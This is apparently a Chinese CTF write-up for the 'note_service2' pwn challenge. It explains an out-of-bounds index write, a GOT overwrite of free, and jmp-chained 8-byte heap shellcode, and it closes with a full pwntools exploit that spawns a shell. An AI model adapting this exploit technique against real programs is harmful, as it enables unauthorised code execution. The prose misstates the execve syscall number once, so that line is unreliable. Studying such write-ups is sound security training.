# note_service2


## 涉及知识

+ 堆shellcode执行
+ shellcode编写

<!--more-->

# 程序分析

## 保护机制

![1.png](https://i.loli.net/2020/05/20/1GVSoTBvUsYJNbh.png)

64位程序，NX保护未开启，堆栈可以代码执行。

## 程序漏洞分析

IDA打开程序，功能十分简单，只有添加和删除两个功能。

添加函数中，由于没有对index做出限制，所以存在修改任意地址内容漏洞。添加的内容，由malloc分配，最大8个字节，并且最后一个字节会被清零。由于堆段有代码执行权限，我们可以在堆段中构造我们的shellcode，再利用任意地址修改，将一个got函数的地址修改为我们shellcode所在地址。

但是由于每次malloc只能分配8个字节，所以编写shellcode时，我们可以利用jmp来跳转。

![1.png](https://i.loli.net/2020/05/20/aXHQvkDVEOeIBZr.png)

![2.png](https://i.loli.net/2020/05/20/cwVfCzrJk4pYKHv.png)

在IDA中观察发现，jmp对应\xEB。从B8跳转到D1之间有0x19，但在十六进制代码中，是0x17，所以我们可以知道，在jmp的跳转数值中，其跳转的值是目标地址减原始地址再减2。

我们读入的字节是7个字节(第8个字节程序自动补0)，如果将jmp放在最后两个字节，那么可以计算得到，其需要跳转的值为0x19。


我们的shellcode利用syscall来使用，其需要的步骤为(64位)：

+ mov rdi,xxx（/bin/sh的地址）

+ mov rsi,0

+ mov rdx,0

+ mov eax,0x3b		0x38为64位程序execv调用号

+ syscall

对于第一个条件，如果我们将free修改为第二条指令的地址，第一个malloc填的值是/bin/sh，当我们free掉第一个时，就会将该堆的地址作为参数传入rdi。

# EXP

````python
from pwn import *
context.arch='amd64'
sh=process('./xctf')
def add(index,content):
	sh.sendlineafter('your choice>> ','1')
	sh.sendlineafter('index:',str(index))
	sh.sendlineafter('size:','8')
	sh.sendlineafter('content',content)

def delt(index):
	sh.sendlineafter('your choice>> ','4')
	sh.sendlineafter('index:',str(index))

code=[asm('xor rsi,rsi'),asm('xor rdx,rdx'),asm('mov eax,0x3B'),asm('syscall')]
free_index=(0x202018-0x2020a0)/8
#for c in code:
#	print len(c)

add(0,'/bin/sh')
add(free_index,code[0]+'\x90\x90\xEB\x19')
add(1,code[1]+'\x90\x90\xEB\x19')
add(2,code[2]+'\xEB\x19')
add(3,code[3])

delt(0)

sh.interactive()
````

## 反思

+ 由于可供编写shellcode的空间有限，在编写时可以将一些占用字节长的代码替换成相同效果但占用少的代码。如:将mov rsi,0 替换为 xor rsi,rsi。rax替换成eax

+ 堆中如果想改变程序的执行流程，一般都是通过修改函数的got表来实现。比如这道题，将free修改为堆中地址，进而在调用free函数时，把控制流劫持到堆栈中

### 参考

[CSDN](https://blog.csdn.net/getsum/article/details/103128511)
